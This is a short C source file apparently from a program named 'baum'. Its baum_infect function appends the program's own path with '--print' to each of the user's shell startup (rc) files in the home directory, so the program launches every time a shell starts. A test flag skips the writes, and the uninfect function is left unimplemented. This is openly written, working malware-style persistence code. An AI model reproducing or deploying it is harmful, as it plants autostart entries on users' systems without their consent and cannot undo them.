#include "infect.h"

#include <stdlib.h>
#include <stdio.h>

#include "baumcommon.h"
#include "baumhelper.h"

int baum_infect(const char *rc_files[]) {
	int hret = 0;

	const char *my_filename = helper_get_own_name();
	if (my_filename == NULL) {
		return 1;
	}

	hret = helper_chdir_home();
	if (hret != 0) {
		return 1;
	}
	bp("Injecting this text: \n%s --print\n", my_filename);

	for (size_t i = 0; rc_files[i] != NULL; i++) {
		bp("Writing to file %s", rc_files[i]);
		if (baumcommon_test) continue;

		FILE *f = fopen(rc_files[i], "a");
		if (f) {
			hret = fprintf(f, "\n%s --print\n", my_filename);
			if (hret > 0) {
				bp("Success");
			} else {
				bp("Failed");
			}
			fclose(f);
		} else {
			bp("Cannot open rcfile");
		}
	}
	return 0;
}

int baum_uninfect(const char *rc_files[]) {
	bp("uninfect not implemented yet");
	return 1;
}

